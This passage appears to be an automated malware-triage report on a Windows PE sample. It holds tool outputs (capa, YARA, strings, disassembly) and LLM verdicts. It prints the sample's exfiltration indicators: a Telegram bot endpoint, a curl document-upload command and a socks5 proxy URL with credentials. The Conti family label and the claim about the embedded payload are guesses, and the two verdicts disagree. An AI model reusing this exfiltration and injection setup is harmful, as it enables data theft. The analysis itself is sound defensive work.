        "name": ".rsrc",
        "effective_address": 480768,
        "physical_size": 1536,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 0
      },
      {
        "name": ".reloc",
        "effective_address": 484864,
        "physical_size": 512,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 52
      },
      {
        "name": "/4",
        "effective_address": 488960,
        "physical_size": 1536,
        "virtual_size": 4096,
        "rights": "R",
        "entropy": 0
      },
      {
        "name": "/19",
        "effective_address": 493056,
        "physical_size": 46080,
        "virtual_size": 49152,
        "rights": "R",
        "entropy": 97
      },
      {
        "name": "/31",
        "effective_address": 542208,
        "physical_size": 9216,
        "virtual_size": 12288,
        "rights": "R",
        "entropy": 111
      },
      {
        "name": "/45",
        "effective_address": 554496,
        "physical_size": 8192,
        "virtual_size": 8192,
        "rights": "R",
        "entropy": 116
      },
      {
        "name": "/57",
        "effective_address": 562688,
… [71220 more chars]
```

### LLM citation grounding

```json
{
  "ok": true,
  "checked": 7,
  "hits": 7,
  "misses": [],
  "hit_examples": [
    "KERNEL32 | CreateRemoteThread, KERNEL32 | WriteProcessMemory, KERNEL32 | VirtualAllocEx, KERNEL32 | VirtualProtect, KERN",
    "inject thread (T1055.003), inject dll (T1055.001), inject thread (T1620 Reflective Code Loading), enumerate processes (T",
    "https://api.telegram.org/bot at address 0x14001F080 Suspicious strings (IDA) This string is a known Telegram Bot API C2 ",
    "PE@9760 (342016 bytes) deep profile / Carved files The sample contains an embedded secondary PE file, a common malware t",
    "inject_thread, screenshot matches YARA rules detect built-in capabilities for thread injection and screen capture, used "
  ],
  "reason": ""
}
```

### LLM / outcome preview

```json
{
  "verdict": "Malicious",
  "family": "Conti ransomware",
  "score": 92,
  "agreement": "llm_and_v1_agree",
  "source": "llm_judge",
  "model": "step-3.7-flash",
  "key_evidence": [
    {
      "source": "ida",
      "query_or_table": "Imports (IDA)",
      "row_or_rule": "KERNEL32 | CreateRemoteThread, KERNEL32 | WriteProcessMemory, KERNEL32 | VirtualAllocEx, KERNEL32 | VirtualProtect, KERNEL32 | CreateToolhelp32Snapshot",
      "why": "These high-signal imports are core to process injection (T1055), remote process memory manipulation, and process enumeration, indicating the sample is designed to inject code into legitimate processes to evade detection."
    },
    {
      "source": "capa",
      "query_or_table": "top_rules",
      "row_or_rule": "inject thread (T1055.003), inject dll (T1055.001), inject thread (T1620 Reflective Code Loading), enumerate processes (T1057), delete file, write file on Windows, allocate or change RWX memory, execute shellcode via indirect call",
      "why": "capa's behavioral rules confirm the sample implements explicit malicious capabilities: process injection via multiple methods, reflective code loading, process discovery, file system tampering, and shellcode execution, all demonstrating hostile intent beyond obfuscation."
    },
    {
      "source": "ida",
      "query_or_table": "Suspicious strings (IDA)",
      "row_or_rule": "https://api.telegram.org/bot at address 0x14001F080",
      "why": "This string is a known Telegram Bot API C2 endpoint, proving the sample communicates with an external command and control server for receiving commands or exfiltrating data, a definitive malicious behavior."
    },
    {
      "source": "malcat",
      "query_or_table": "deep profile / Carved files",
      "row_or_rule": "PE@9760 (342016 bytes)",
      "why": "The sample contains an embedded secondary PE file, a common malware technique to store additional malicious payloads (e.g., the Conti ransomware encryptor) in memory without writing to disk to avoid detection."
    },
    {
      "source": "yara",
      "query_or_table": "matches",
      "row_or_rule": "inject_thread, screenshot",
      "why": "YARA rules detect built-in capabilities for thread injection and screen capture, used for process evasion and stealing sensitive data (credentials, user activity) respectively, further confirming malicious intent."
    },
    {
      "source": "malcat",
      "query_or_table": "Decompilations (3 top functions)",
      "row_or_rule": "sub_140001550 decompilation: writes DLL to temp path %s\\dl%lu.dll, locates explorer.exe process, opens it with OpenProcess, allocates memory with VirtualAllocEx",
      "why": "This decompiled code provides concrete proof of DLL injection into the legitimate explorer.exe system process, a classic evasion technique to run malicious code under the guise of a trusted process."
    },
    {
      "source": "pe_imports",
      "query_or_table": "pe_imports signals",
      "row_or_rule": "VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, GetProcAddress, VirtualProtect",
      "why": "These high-signal imports map directly to MITRE ATT&CK T1055 (Process Injection) and T1129 (Shared Modules), confirming the sample's capability to inject code into remote processes and load malicious modules at runtime."
    }
  ],
  "summary": "This is a malicious Conti ransomware loader/injector sample. It uses DLL injection into the legitimate explorer.exe process to execute malicious code stealthily, communicates with a Telegram-based C2 server for command and control, contains an embedded secondary PE payload (likely the Conti ransomware encryptor), and implements capabilities for process enumeration, file system manipulation (write/"
}
```

### Artifact paths (verify on disk)

- **prompt:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/prompt.txt` exists=`True` bytes=`31877` mtime=`2026-08-08T02:29:09.452031+00:00`
  - sha256: `adcf13776413923a7aa016be7204d6b5ecbeb8b92c88a322ad86f7a5292790f2`
- **verdict:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/verdict.json` exists=`True` bytes=`6869` mtime=`2026-08-08T02:30:02.427893+00:00`
  - sha256: `e693436ced4c0c7b987b5eae4082f043c30fec5669709451cdcf403ca4dc8c7e`

#### prompt_excerpt

```
# Triage evidence
sha256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9
sample_path: /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti
ghidra_session: ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9
ida_session: ida-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9

## Source decisions (from intake validation)
- imports: ghidra (confidence=medium) — Ghidra reports 66 imports (ghidra, imports, 66), IDA reports 66 imports (ida, imports, 66), and Malcat reports 66 imports (malcat, imports_count, 66); counts are identical and within the 20% threshold, so Ghidra is selected per existing rule.
- functions: ghidra (confidence=medium) — Ghidra reports 86 functions (ghidra, funcs, 86), IDA reports 115 functions (ida, funcs, 115), which is within 2x of Ghidra's count; Malcat's function count (malcat, functions_count, 10) is a significant outlier a
… [30844 more chars]
```


#### verdict_excerpt

```
{
  "verdict": "Malicious",
  "score": 92,
  "family_guess": "Conti ransomware",
  "cross_engine_notes": "IDA reports 115 functions while Ghidra reports 86, a discrepancy explained by Ghidra not identifying small import thunks and stub functions that IDA detects, consistent with standard reverse engineering tool behavior. Import counts are consistent across IDA (66), Malcat (66), and pe_imports (66), with all high-signal process injection APIs present across all sources, confirming no import detection gaps. The critical Telegram C2 string and DLL injection path format string are present in both IDA (5940 total strings) and Ghidra (5317 total strings) outputs, confirming string detection consistency. Malcat's high entropy (98) and XorInLoop anomaly are corroborated by capa's RC4 encryption rule, confirming these are not benign obfuscation but part of malicious functionality (encrypted C2 communications or payload encryption). Per the known limitation note, the Ghidra imports table is em
… [5869 more chars]
```


---

## Stage: deep_dive

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| 01_tools_raw | `True` |
| 00_sql_evidence | `False` |
| 03_prompt | `False` |
| 04_llm | `False` |
| 05_deep | `True` |
| tools_all_ok | `True` |
| llm_source | `False` |
| citations_grounded | `True` |
| engine_citation_ok | `True` |
| upx_second_pass_ok | `True` |
| no_incomplete_tooling | `True` |
| confidence_sane | `True` |
| evidence_pack_present | `True` |
| depth_coverage | `True` |
| agentic_json | `True` |
| sql_deep_re | `True` |
| complete_verdict | `True` |
| not_incomplete | `True` |
| checklist_ok_flag | `True` |
| agentic_confidence_sane | `True` |

### Tools (full evidence excerpts)

#### `malcat` — ok=`True` why=`not_applicable:pe`

```json

```

#### `capa` — ok=`True` why=`ok`

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Cryptography",
            "Encrypt Data",
            "RC4"
          ],
          "objective": "Cryptography",
          "behavior": "Encrypt Data",
          "method": "RC4",
          "id": "C0027.009"
        },
        {
          "parts": [
            "Cryptography",
            "Generate Pseudo-random Sequence",
            "RC4 PRGA"
          ],
          "objective": "Cryptography",
          "behavior": "Generate Pseudo-random Sequence",
          "method": "RC4 PRGA",
          "id": "C0021.004"
        }
      ]
    },
    {
      "name": "get common file path",
      "attack": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "tactic": "Discovery",
          "technique": "File and Directory Discovery",
          "subtechnique": "",
          "id": "T1083"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "objective": "Discovery",
          "behavior": "File and Directory Discovery",
          "method": "",
          "id": "E1083"
        }
      ]
    },
    {
      "name": "inject thread",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Process Injection",
            "Thread Execution Hijacking"
          ],
          "tactic": "Defense Evasion",
          "technique": "Process Injection",
          "subtechnique": "Thread Execution Hijacking",
          "id": "T1055.003"
        },
        {
          "parts": [
            "Defense Evasion",
            "Reflective Code Loading"
          ],
          "tactic": "Defense Evasion",
          "technique": "Reflective Code Loading",
          "subtechnique": "",
          "id": "T1620"
        }
      ],
      "mbc": []
    },
    {
      "name": "enumerate processes",
      "attack": [
        {
          "parts": [
            "Discovery",
            "Process Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Process Discovery",
          "subtechnique": "",
          "id": "T1057"
        },
        {
          "parts": [
            "Discovery",
            "Software Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Software Discovery",
          "subtechnique": "",
          "id": "T1518"
        }
      ],
      "mbc": []
    },
    {
      "name": "contain an embedded PE file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "Execution",
            "Install Additional Program"
          ],
          "objective": "Execution",
          "behavior": "Install Additional Program",
          "method": "",
          "id": "B0023"
        }
      ]
    },
    {
      "name": "delete file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "File System",
            "Delete File"
          ],
          "objective": "File System",
          "behavior": "Delete File",
          "method"
… [3308 more chars]
```

#### `pe_imports` — ok=`True` why=`ok`

```json
{
  "engine": "pe_imports",
  "sample_size": 593885,
  "duration_s": 0.04,
  "import_count": 66,
  "signal_count": 5,
  "signals": [
    {
      "label": "allocate_memory",
      "api_match": "VirtualAllocEx",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "write_process_memory",
      "api_match": "WriteProcessMemory",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "create_remote_thread",
      "api_match": "CreateRemoteThread",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "get_proc_address",
      "api_match": "GetProcAddress",
      "attack": [
        "T1129"
      ]
    },
    {
      "label": "change_memory_protection",
      "api_match": "VirtualProtect",
      "attack": [
        "T1055"
      ]
    }
  ],
  "hint": "PE import high-signal map (pefile). Not capa."
}
```

#### `yara` — ok=`True` why=`ok`

```json
{
  "rule_count": 12,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "spyeye",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$f",
          "offset": 452832,
          "length": 8,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$ipv4",
          "offset": 124590,
          "length": 28,
          "xor_key": null
        },
        {
          "id": "$ipv6",
          "offset": 124914,
          "length": 6,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$a",
          "offset": 1600,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "url",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$url_regex",
          "offset": 124032,
          "length": 56,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "HasOverlay",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "SEH__v4",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$",
          "offset": 592021,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "inject_thread",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$c1",
          "offset": 465120,
          "length": 11,
          "xor_key": null
        },
        {
          "id": "$c2",
          "offset": 465220,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$c4",
          "offset": 465322,
          "length": 18,
          "xor_key": null
        },
        {
          "id": "$c5",
          "offs
… [4046 more chars]
```

#### `floss` — ok=`True` why=`ok`

```json
{
  "floss_ok": true,
  "string_count": 7006,
  "strings_sampled": 80,
  "strings": [
    "!This program cannot be run in DOS mode.",
    "`.data",
    ".rdata",
    "@.pdata",
    "@.xdata",
    ".idata",
    "@.reloc",
    "=CCG u",
    "AWAVAUATUWVSH",
    "X[^_]A\\A]A^A_",
    "8MZuJHcP<H",
    "AVWVSH",
    "UAVAUATWVSH",
    "[^_A\\A]A^]",
    "([^_]H",
    "@' t\tH",
    ".edata",
    "@.idata",
    ".reloc",
    "AVATUWVS",
    "TestpassI",
    "[^_]A\\A^A_",
    "h;\\$Xs#I",
    "J(A;J,}4Hc",
    "I(D;I,}FIc",
    "<_t`<ntT",
    "R(A;R,}-Hc",
    "ATUWVSH",
    "P[^_]A\\",
    "_GLOBAL_H9",
    "BHA;R,}VHc",
    "C8;C<|",
    "X[^_A^",
    "0[^_]A\\",
    "R(A;R,}",
    "AVUWVSH",
    "P[^_]A^",
    "U(;U,}:Hc",
    "<Et6<Qt2H",
    "D$0<Qt@H",
    "<st\\<f",
    "AVAUATUWVSH",
    "0[^_]A\\A]A^",
    "C8;C<}ZH",
    "C(;C,}3Lc",
    "C(;C,L",
    "D$ }hLc",
    "AWAVATUWVSH",
    "`[^_]A\\",
    "UAWAVAUATWVSH",
    "0<\tw5A",
    "[^_A\\A]A^A_]",
    "H[^_A^",
    "~D$8fH",
    "@$A9@(~",
    "C$9C(~",
    "@[^_]A\\",
    "S$9S(~",
    "UAVWVSH",
    "[^_A^]",
    "=UUUUw",
    "[^_]A\\A]A^A_",
    "IcP$fA",
    "HcC$fA",
    "LcC$fB",
    "HcS$fA",
    "8[^_]A\\A]A^A_",
    "D$L)D$X",
    "L$8HcD$L;A",
    "D$X+D$`",
    "ATUWVSLcY",
    "[^_]A\\",
    "[^_]A\\A]A^",
    "AUATUWVSH",
    "([^_]A\\A]",
    "WVSHcA",
    "H[^_]H",
    "H[^_]A\\A]",
    "H[^_]A\\A]H",
    "([^_A^H"
  ],
  "per_category": {
    "decoded_strings": 0,
    "stack_strings": 0,
    "tight_strings": 0,
    "language_strings": 0,
    "language_strings_missed": 0,
    "static_strings": 7006
  },
  "raw_key_total": 3,
  "floss_profile": "full",
  "floss_language": "none",
  "duration_s": 8.66,
  "size_bytes": 593885,
  "static_only": false,
  "size_exceeded_deobfuscate_limit": false
}
```

#### `dotnet` — ok=`True` why=`ok`

```json
{
  "is_dotnet": false,
  "runtime_version": null,
  "assembly_name": null,
  "module_name": null,
  "language_hint": null,
  "external_assembly_refs": [],
  "suspicious_native_refs": [],
  "suspicious_methods": [],
  "interesting_pinvoke": [],
  "has_suppress_ildasm": false,
  "shellcode_embed_hint": false,
  "il_total_lines": 0,
  "il_excerpt": ""
}
```

#### `r2_decomp` — ok=`True` why=`ok`

```json
{
  "r2_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "disassembly": {
    "0x140001440": "\u254e   ;-- WinMainCRTStartup:\n\u250c 18: entry0 ();\n\u2502       \u254e   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090\n\u2502       \u254e   0x140001447      c70001000000   mov dword [rax], 1\n\u2514       \u2514\u2500< 0x14000144d      e9eefbffff     jmp sym.__tmainCRTStartup  ; synchapi.h:138:0",
    "0x140001000": ";-- section..text:\n            ; DATA XREF from sym.__tmainCRTStartup @ 0x1400011a0(r)\n\u250c 1: sym.__mingw_invalidParameterHandler ();\n\u2514           0x140001000      c3             ret                        ; synchapi.h:88:0 ; [00] -r-x section size 8192 named .text",
    "0x140001010": "; DATA XREF from sym.__tmainCRTStartup @ 0x14000139c(r)\n\u250c 31: sym.cpp_unhandled_exception_filter (int64_t arg1);\n\u2502           ; arg int64_t arg1 @ rcx\n\u2502           0x140001010      31d2           xor edx, edx               ; synchapi.h:103:0\n\u2502           0x140001012      488b09         mov rcx, qword [rcx]       ; synchapi.h:118:0 ; arg1\n\u2502           0x140001015      8b01           mov eax, dword [rcx]       ; arg1\n\u2502           0x140001017      25ffffff20     and eax, 0x20ffffff\n\u2502           0x14000101c      3d43434720     cmp eax, 0x20474343        ; 'CCG '\n\u2502       \u250c\u2500< 0x140001021      7509           jne 0x14000102c\n\u2502       \u2502   0x140001023      8b5104         mov edx, dword [rcx + 4]   ; synchapi.h:119:0 ; arg1\n\u2502       \u2502   0x140001026      83e201         and edx, 1\n\u2502       \u2502   0x140001029      83ea01         sub edx, 1                 ; synchapi.h:118:0\n\u2502       \u2514\u2500> 0x14000102c      89d0           mov eax, edx               ; synchapi.h:123:0\n\u2514           0x14000102e      c3             ret",
    "0x140001030": "; DATA XREF from sym.__tmainCRTStartup @ 0x140001185(r)\n\u250c 7: sym.safe_flush ();\n\u2502           0x140001030      31c9           xor ecx, ecx               ; synchapi.h:127:0\n\u2514       \u250c\u2500< 0x140001032      e9b1190000     jmp sym.fflush             ; synchapi.h:129:0",
    "0x140001040": "\u250c 980: sym.__tmainCRTStartup (int64_t arg_1h);\n\u2502           ; arg int64_t arg_1h @ rbp+0x1\n\u2502           ; var int64_t var_20h @ rsp+0x20\n\u2502           ; var int64_t var_3ch @ rsp+0x3c\n\u2502           ; var int64_t var_4ch @ rsp+0x4c\n\u2502           0x140001040      4157           push r15                   ; synchapi.h:157:0\n\u2502           0x140001042      4156           push r14\n\u2502           0x140001044      4155           push r13\n\u2502           0x140001046      4154           push r12\n\u2502           0x140001048      55             push rbp\n\u2502           0x140001049      57             push rdi\n\u2502           0x14000104a      56             push rsi\n\u2502           0x14000104b      53             push rbx\n\u2502           0x14000104c      4883ec58       sub rsp, 0x58\n\u2502           0x140001050      65488b0425..   mov rax, qword gs:[0x30]   ; synchapi.h:167:0\n\u2502           0x140001059      488b7008       mov rsi, qword [rax + 8]   ; synchapi.h:175:0\n\u2502           0x14000105d      488b1dec03..   mov rbx, qword [0x140071450] ; synchapi.h:176:0 ; [0x140071450:8]=0x140074040\n\u2502 
… [2704 more chars]
```

#### `upx` — ok=`True` why=`ok`

```json
{
  "upx_ok": false,
  "is_packed": false,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "upx_probe_stdout": "                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2026\nUPX 5.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 7th 2026\n\n\nTested 0 file"
}
```

#### `xor` — ok=`True` why=`ok`

```json
{
  "xorsearch_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "candidates": [
    "Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r",
    "Found XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r"
  ],
  "xorsearch_stdout": "Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r\nFound XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r\n",
  "xorsearch_stderr": "",
  "xorsearch_returncode": 0
}
```

#### `speakeasy` — ok=`True` why=`ok`

```json
{
  "speakeasy_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "module_base": null,
  "entry_point": null,
  "key_events": [],
  "api_calls": [],
  "strings": []
}
```

#### `frida_probe` — ok=`True` why=`ok`

```json
{
  "frida_available": true,
  "frida_version": "17.16.4",
  "pe_probe": {
    "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "exists": true,
    "hook_candidates": [
      "KERNEL32.dll!CloseHandle",
      "KERNEL32.dll!CreateFileW",
      "KERNEL32.dll!CreateRemoteThread",
      "KERNEL32.dll!CreateToolhelp32Snapshot",
      "KERNEL32.dll!DeleteCriticalSection",
      "api-ms-win-crt-environment-l1-1-0.dll!__p__environ",
      "api-ms-win-crt-heap-l1-1-0.dll!_set_new_mode",
      "api-ms-win-crt-heap-l1-1-0.dll!calloc",
      "api-ms-win-crt-heap-l1-1-0.dll!free",
      "api-ms-win-crt-heap-l1-1-0.dll!malloc",
      "api-ms-win-crt-locale-l1-1-0.dll!_configthreadlocale",
      "api-ms-win-crt-math-l1-1-0.dll!__setusermatherr",
      "api-ms-win-crt-private-l1-1-0.dll!memcpy",
      "api-ms-win-crt-runtime-l1-1-0.dll!__p___argc",
      "api-ms-win-crt-runtime-l1-1-0.dll!__p___argv",
      "api-ms-win-crt-runtime-l1-1-0.dll!__p__acmdln",
      "api-ms-win-crt-runtime-l1-1-0.dll!_cexit",
      "api-ms-win-crt-runtime-l1-1-0.dll!_configure_narrow_argv",
      "api-ms-win-crt-stdio-l1-1-0.dll!__acrt_iob_func",
      "api-ms-win-crt-stdio-l1-1-0.dll!__p__commode",
      "api-ms-win-crt-stdio-l1-1-0.dll!__p__fmode",
      "api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vfprintf",
      "api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vswprintf",
      "api-ms-win-crt-string-l1-1-0.dll!_stricmp",
      "api-ms-win-crt-string-l1-1-0.dll!memset",
      "api-ms-win-crt-string-l1-1-0.dll!strlen",
      "api-ms-win-crt-string-l1-1-0.dll!strncmp",
      "api-ms-win-crt-string-l1-1-0.dll!wcslen"
    ]
  }
}
```

#### `frida_trace` — ok=`True` why=`not_applicable:pe`

```json

```

### LLM citation grounding

```json
{
  "ok": true,
  "checked": 17,
  "hits": 17,
  "misses": [],
  "hit_examples": [
    "YARA inject_thread strings at offsets 465120, 465220, 465322, 464790, 150610 (rule: inject_thread)",
    "YARA screenshot strings at offsets 152012, 152784, 150226, 151934 (rule: screenshot)",
    "YARA win_mutex string at offset 150576: Global\\\\BeaconMutex_12345 (rule: win_mutex)",
    "String at 5368836128: C:\\\\Windows\\\\System32\\\\curl.exe",
    "String at 5368836224: https://api.telegram.org/bot"
  ],
  "reason": ""
}
```

### LLM / outcome preview

```json
{
  "source": "deep_dive_agentic",
  "confidence": 90,
  "summary": "64-bit Windows GUI PE with overlay and SEH. Static and behavioral evidence shows it is an info-stealer/surveillance implant: it uses process injection APIs (CreateRemoteThread, WriteProcessMemory, VirtualAllocEx, VirtualProtect), captures screenshots via GDI/GdiPlus (GdiplusStartup/Shutdown, ImageFo",
  "key_evidence": [
    "YARA inject_thread strings at offsets 465120, 465220, 465322, 464790, 150610 (rule: inject_thread)",
    "YARA screenshot strings at offsets 152012, 152784, 150226, 151934 (rule: screenshot)",
    "YARA win_mutex string at offset 150576: Global\\\\BeaconMutex_12345 (rule: win_mutex)",
    "String at 5368836128: C:\\\\Windows\\\\System32\\\\curl.exe",
    "String at 5368836224: https://api.telegram.org/bot",
    "String at 5368836382: /sendDocument",
    "String at 5368836416: curl POST command with --proxy, chat_id, document upload",
    "String at 5368836736: socks5://oWWV0o:PTotFP@138.122.192.59:8000",
    "String at 5368836844: Global\\\\BeaconMutex_12345",
    "String at 5368836194: %s\\\\tmp%lu.dat",
    "String at 5368836822: image/jpeg",
    "Ghidra imports: CreateRemoteThread, WriteProcessMemory, VirtualAllocEx, VirtualProtect, OpenProcess, GetProcAddress (process injection T1055)",
    "Ghidra imports: GdiplusStartup, GdiplusShutdown, ImageFormatJPEG, CreateCompatibleBitmap, CreateCompatibleDC, SelectObject, ReleaseDC, DeleteDC, DeleteObject (screenshot capability)",
    "capa rule: inject thread (T1055.003)",
    "capa rule: encrypt data using RC4 PRGA (T1027)",
    "capa rule: contain an embedded PE file",
    "Checklist: IsPE64, IsWindowsGUI, HasOverlay, SEH__v4"
  ],
  "model": null,
  "llm_audit": null
}
```

### Agentic tool-call history (excerpts)

- **yara_scan** ok=`True` checklist=`True` — Required checklist tool (yara)

```json
{
  "rule_count": 12,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule
… [7146 more chars]
```

- **malcat_analyze** ok=`True` checklist=`True` — Required checklist tool (malcat)

```json
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "profile": "deep",
  "limits": {
    "strings_max": 300,
    "imports_max": 300,
    "functions_max": 30,
    "anomaly_locations_max": 50,
    "decompile_top_n": 3
  },
  "file_summary": {
    "analysis_id": 1,
    "file_na
… [74298 more chars]
```

- **capa_analyze** ok=`True` checklist=`True` — Required checklist tool (capa)

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
 
… [6408 more chars]
```

- **pe_import_signals** ok=`True` checklist=`True` — Required checklist tool (pe_imports)

```json
{
  "engine": "pe_imports",
  "sample_size": 593885,
  "duration_s": 0.04,
  "import_count": 66,
  "signal_count": 5,
  "signals": [
    {
      "label": "allocate_memory",
      "api_match": "VirtualAllocEx",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "write_process_memory",
      "api_match": "WriteProcessMemory",
      "attack": [
        "T1055"
      ]
    },
    {

… [454 more chars]
```

- **floss_extract** ok=`True` checklist=`True` — Required checklist tool (floss)

```json
{
  "floss_ok": true,
  "string_count": 7006,
  "strings_sampled": 80,
  "strings": [
    "!This program cannot be run in DOS mode.",
    "`.data",
    ".rdata",
    "@.pdata",
    "@.xdata",
    ".idata",
    "@.reloc",
    "=CCG u",
    "AWAVAUATUWVSH",
    "X[^_]A\\A]A^A_",
    "8MZuJHcP<H",
    "AVWVSH",
    "UAVAUATWVSH",
    "[^_A\\A]A^]",
    "([^_]H",
    "@' t\tH",
    ".edata",
    "@.id
… [1398 more chars]
```

- **dotnet_analyze** ok=`True` checklist=`True` — Required checklist tool (dotnet)

```json
{
  "is_dotnet": false,
  "runtime_version": null,
  "assembly_name": null,
  "module_name": null,
  "language_hint": null,
  "external_assembly_refs": [],
  "suspicious_native_refs": [],
  "suspicious_methods": [],
  "interesting_pinvoke": [],
  "has_suppress_ildasm": false,
  "shellcode_embed_hint": false,
  "il_total_lines": 0,
  "il_excerpt": ""
}
```

- **r2_decompile** ok=`True` checklist=`True` — Required checklist tool (r2_decomp)

```json
{
  "r2_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "disassembly": {
